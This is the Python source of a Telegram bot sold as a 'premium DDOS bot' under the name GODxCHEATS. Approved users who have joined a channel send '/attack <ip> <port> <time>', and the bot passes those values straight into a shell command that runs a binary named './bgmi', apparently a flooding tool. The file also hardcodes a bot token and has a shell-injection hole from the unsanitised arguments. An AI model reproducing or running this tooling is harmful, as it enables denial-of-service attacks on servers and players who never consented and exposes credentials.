import asyncio
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
import os

# Configuration
TELEGRAM_BOT_TOKEN = ("8016978575:AAGtZq2YIQKIdUuDsx-tb8APm5_SPystyTs")  # Fetch token from environment variable
ADMIN_USER_ID = 1662672529
APPROVED_IDS_FILE = 'approved_ids.txt'
CHANNEL_ID = "@jsbananannanan"  # Replace with your channel username

# Global cooldown and attack limits
attack_in_progress = False
last_attack_time = {}

# Constants
MAX_ATTACK_TIME = 150  # 150 seconds limit on attack time

# Check if the token is set
if not TELEGRAM_BOT_TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN environment variable not set. Please set the token and try again.")

# Load and Save Functions for Approved IDs
def load_approved_ids():
    """Load approved user and group IDs from a file."""
    try:
        with open(APPROVED_IDS_FILE, 'r') as file:
            return set(line.strip() for line in file.readlines())
    except FileNotFoundError:
        return set()

def save_approved_ids():
    """Save approved user and group IDs to a file."""
    with open(APPROVED_IDS_FILE, 'w') as file:
        file.write("\n".join(approved_ids))

approved_ids = load_approved_ids()

# Helper Function: Check User Permissions
async def is_admin(chat_id):
    """Check if the user is the admin."""
    return chat_id == ADMIN_USER_ID

async def is_member_of_channel(user_id: int, context: CallbackContext):
    """Check if the user is a member of the specified channel."""
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception:
        return False

# Commands
async def start(update: Update, context: CallbackContext):
    """Send a welcome message to the user."""
    chat_id = update.effective_chat.id
    message = (
        "*WELCOME TO GODxCHEATS DDOS*\n\n"
        "*PREMIUM DDOS BOT*\n"
        "*Owner*: @GODxAloneBOY\n"
        f"🔔 *Join our channel*: {CHANNEL_ID} to use advanced features.\n\n"
        "Use /help to see available commands."
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    """Send a list of available commands and their usage."""
    chat_id = update.effective_chat.id
    message = (
        "*Available Commands:*\n\n"
        "/start - Start the bot and get a welcome message.\n"
        "/help - Show this help message.\n"
        "/approve <id> - Approve a user or group ID (admin only).\n"
        "/remove <id> - Remove a user or group ID (admin only).\n"
        "/alluser - List all approved users and groups (admin only).\n"
        "/attack <ip> <port> <time> - Launch an attack (approved users only).\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def approve(update: Update, context: CallbackContext):
    """Approve a user or group ID to use the bot."""
    chat_id = update.effective_chat.id
    args = context.args

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /approve <id>*", parse_mode='Markdown')
        return

    # Extract the target ID
    target_id = args[0].strip()

    # Validate that the target ID is a number
    if not target_id.lstrip('-').isdigit():
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid ID format. Must be a numeric ID.*", parse_mode='Markdown')
        return

    # Add the target ID to the approved list
    approved_ids.add(target_id)
    save_approved_ids()

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} approved.*", parse_mode='Markdown')

async def remove(update: Update, context: CallbackContext):
    """Remove a user or group ID from the approved list."""
    chat_id = update.effective_chat.id
    args = context.args

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /remove <id>*", parse_mode='Markdown')
        return

    target_id = args[0].strip()
    if target_id in approved_ids:
        approved_ids.remove(target_id)
        save_approved_ids()
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} removed.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ ID {target_id} is not approved.*", parse_mode='Markdown')

async def alluser(update: Update, context: CallbackContext):
    """List all approved users and groups."""
    chat_id = update.effective_chat.id

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
        return

    if not approved_ids:
        await context.bot.send_message(chat_id=chat_id, text="*No approved users found.*", parse_mode='Markdown')
        return

    user_list = "\n".join(approved_ids)
    await context.bot.send_message(chat_id=chat_id, text=f"*Approved Users and Groups:*\n\n{user_list}", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    """Launch an attack if the user is approved and a channel member."""
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    # Check if the user has already launched an attack in the past 150 seconds
    current_time = time.time()
    if user_id in last_attack_time and current_time - last_attack_time[user_id] < MAX_ATTACK_TIME:
        wait_time = MAX_ATTACK_TIME - (current_time - last_attack_time[user_id])
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*⚠️ You must wait {int(wait_time)} more seconds before starting another attack.*",
            parse_mode='Markdown'
        )
        return

    # Validate if the user is approved
    if str(chat_id) not in approved_ids and str(user_id) not in approved_ids:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
        return

    # Validate if the user is a member of the channel
    if not await is_member_of_channel(user_id, context):
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You must join our channel ({CHANNEL_ID}) to use this feature.*", parse_mode='Markdown')
        return

    # Check if attack is already in progress
    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please wait for the current attack to finish.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /attack <ip> <port> <time>*", parse_mode='Markdown')
        return

    ip, port, time = args

    try:
        # Limit attack time to 150 seconds
        attack_duration = min(int(time), MAX_ATTACK_TIME)

        # Send start attack message with updated format
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"*🔥 ATTACK INITIATED 🔥*\n\n"
                f"*🎯 TARGET IP:* {ip}\n"
                f"*🔌 PORT:* {port}\n"
                f"*⏱ DURATION:* {attack_duration} seconds\n\n"
                "*Stand by as the attack is in progress...*"
            ),
            parse_mode='Markdown'
        )

        # Set last attack time to enforce cooldown
        last_attack_time[user_id] = current_time

        # Simulate running the attack
        await run_attack(chat_id, ip, port, attack_duration, context)

    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid duration. Please provide a number for time.*", parse_mode='Markdown')


async def run_attack(chat_id, ip, port, duration, context):
    """Simulate an attack process."""
    global attack_in_progress
    attack_in_progress = True

    try:
        # Simulate the attack process
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration} 500",  # Example subprocess (replace with real attack)
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        # Print attack output to console (for logging purposes)
        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

        # Attack finished message
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "*🔥 ATTACK COMPLETED 🔥*\n\n"
                "*✅ The target has been successfully hit!* 🎯\n"
                "*⏱ Duration: {duration} seconds*\n\n"
                "*Thank you for using our service! Please share your feedback.*"
            ),
            parse_mode='Markdown'
        )

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False

# Main Function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Command Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("alluser", alluser))
    application.add_handler(CommandHandler("attack", attack))

    application.run_polling()

if __name__ == '__main__':
    main()
